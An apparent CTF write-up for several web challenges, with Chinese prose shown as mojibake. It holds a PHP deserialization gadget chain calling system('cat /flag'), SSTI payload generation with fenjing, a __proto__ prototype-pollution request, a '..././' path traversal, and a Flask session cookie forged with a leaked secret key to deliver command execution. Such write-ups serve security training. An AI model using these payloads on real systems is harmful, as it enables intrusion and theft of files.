<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$wg</span> = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="variable">$wg</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$wg</span>-&gt;<span class="keyword">var</span>  = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$ctf</span>-&gt;handle = <span class="variable">$wg</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$handle</span>-&gt;obj = <span class="variable">$ctf</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$super</span> = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$super</span>-&gt;obj = <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$then</span> = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;Then&#x27;</span>);</span><br><span class="line"><span class="variable">$prop</span> = <span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;func&#x27;</span>);</span><br><span class="line"><span class="variable">$prop</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$prop</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$then</span>, <span class="variable">$super</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$begin</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$begin</span>-&gt;name = <span class="variable">$then</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$begin</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>ÂèëÂåÖÊâæÂà∞Ë∑ØÁî±<code>/secr3tofpop</code>ÔºåÂèëÁé∞ÊòØSSTIÔºåÁî®webuiÁöÑfenjingÊàñËÄÖÊòØÁõ¥Êé•ÊîªÂáªËøô‰∏™ÂèÇÊï∞</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> fenjing webui</span><br><span class="line"></span><br><span class="line">python <span class="literal">-m</span> fenjing crack <span class="literal">--url</span> <span class="string">&quot;http://c2e17393-1f82-4896-87bc-94bd454fc77e.node5.buuoj.cn:81/secr3tofpop&quot;</span> <span class="literal">--method</span> GET <span class="literal">--inputs</span> name <span class="literal">--detect-mode</span> fast</span><br></pre></td></tr></table></figure>

<h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>Ê≤°ÊâæÂà∞ÂèØ‰ª•Áõ¥Êé•Ê±°ÊüìRCEÁöÑ‰æùËµñÔºåÁúãÁúãË∑ØÁî±</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Âú®configÈáåÈù¢Êúâ‰∏Ä‰∏™ÊúÄÊó©ÂÖÅËÆ∏ÁöÑÊó∂Èó¥ÔºåÂíåÊàë‰º†ÂÖ•ÁöÑÊó∂Èó¥ÂÅöÂØπÊØîÔºåÂèñÂ§ßÂÄºÔºåÂÜçÂéªÊï∞ÊçÆÂ∫ìÊü•ËØ¢Êï∞ÊçÆÔºåÊàëÂÖ®Â±ÄÊêúÁ¥¢‰πüÊ≤°ÊúâÊâæÂà∞ËøîÂõûflagÁöÑÈÄªËæëÔºåÊâÄ‰ª•Â∫îËØ•Â∞±ÊòØËøôÈáå‰∫Ü</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Êó©‰∫éËøô‰∏™Êó∂Èó¥Â∞±ÂèØ‰ª•‰∫ÜÔºå‰ΩÜÊòØÂøÖÈ°ªÁ¨¨‰∏ÄÊ¨°Â∞±ÊàêÂäüÔºåÁî±‰∫éÊ±°ÊüìÁöÑÁâπÊÄßÔºåÁ¨¨‰∫åÊ¨°Â∞±‰ºöÂùè‰∫Ü</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;min_public_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1001-01-01&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81/info/0&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">res=requests.post(url=url,headers=&#123;<span class="string">&#x27;content-type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><blockquote>
<p>Á©øË∂äÊàëÁöÑÁßòÂØÜÔºåÁã†Áã†ÁöÑÊ≥®ÂÖ•</p>
</blockquote>
<p><code>110.jpg</code>ÂèØ‰ª•ÁúãÂà∞ÈÉ®ÂàÜÊ∫êÁ†ÅÁöÑË∑ØÁî±<code>/download?file=..././..././app.py</code>ÂæóÂà∞Ê∫êÁ†Å</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;Á´üÁÑ∂Áªô&lt;h1&gt;%s&lt;/h1&gt;‰Ω†ÊâæÂà∞‰∫ÜÊàëÁöÑÂêéÈó®Ôºå‰Ω†‰∏ÄÂÆöÊòØÁΩëÁªúÂÆâÂÖ®Â§ßËµõÂÜ†ÂÜõÂêßÔºÅüòù &lt;br&gt; ÈÇ£‰πà Áé∞Âú®ËΩÆÂà∞‰Ω†‰∫Ü!&lt;br&gt; ÊúÄÂêéÁ•ùÊÇ®Áé©ÂæóÊÑâÂø´!üòÅ&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>session‰∏≠ÁöÑuser‰ºöË¢´‰∏çÊ≠£ÂΩìÁöÑÊ∏≤ÊüìÔºå<code>config.py</code>ÈáåÈù¢ËØªÂèñÂà∞<code>y0u_n3ver_k0nw_s3cret_key_1s_newst4r</code>Ëøô‰∏™KEYÔºåÂ∞±ÂèØ‰ª•RCE‰∫Ü</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line">BLACKLIST = [</span><br><span class="line">    <span class="string">&quot;__&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;globals&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;tac&quot;</span>,</span><br><span class="line">    <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;\\x&quot;</span>, <span class="string">&quot;.&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_fenjing_payload</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_signed_cookie</span>(<span class="params">payload: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_json = json.dumps(&#123;<span class="string">&quot;user&quot;</span>: payload&#125;, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    proc = subprocess.run(</span><br><span class="line">        [<span class="string">&quot;flask-unsign&quot;</span>, <span class="string">&quot;--sign&quot;</span>, <span class="string">&quot;--cookie&quot;</span>, cookie_json, <span class="string">&quot;--secret&quot;</span>, secret],</span><br><span class="line">        capture_output=<span class="literal">True</span>, text=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> proc.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;flask-unsign failed: <span class="subst">&#123;proc.stderr.strip()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> proc.stdout.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ssti_payload = gen_fenjing_payload(&quot;ls /&quot;)</span></span><br><span class="line">    ssti_payload = gen_fenjing_payload(<span class="string">&quot;tac /y0U3_f14g_1s_h3re&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fenjing payload:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ssti_payload)</span><br><span class="line"></span><br><span class="line">    secret = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line">    signed_cookie = gen_signed_cookie(ssti_payload, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSigned cookie:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(signed_cookie)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/backdoor</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>http://baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81/cancanneed?file=1.jpg</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJxdzcEKgkAQBuBXkYH49VRRp96jk8qitdnC6i676yHEnj1_CYMO8zEzP8NMMkYd5CLTzgczpCzPrfFx7EsovNfqAOvaxsbvrFD_whYYjU1m-EuhTO9dSOxQ53BARFGU8IDzelh2laRKKmnIjWRkT17kQK7kRBR5kCM5k24L1l3cxud2FoiuhL-Dbu7L42I3y_wBmNpHmg.aJbi0A.VyZ7WpCdIRqTZl5WzFJtWw4jAfs</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ÈÄÉ"><a href="#ÈÄÉ" class="headerlink" title="ÈÄÉ"></a>ÈÄÉ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); www-data www-data</span><br></pre></td></tr></table></figure>

<p>Â≠óÁ¨¶Â¢ûÂ§öÁöÑÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</p>
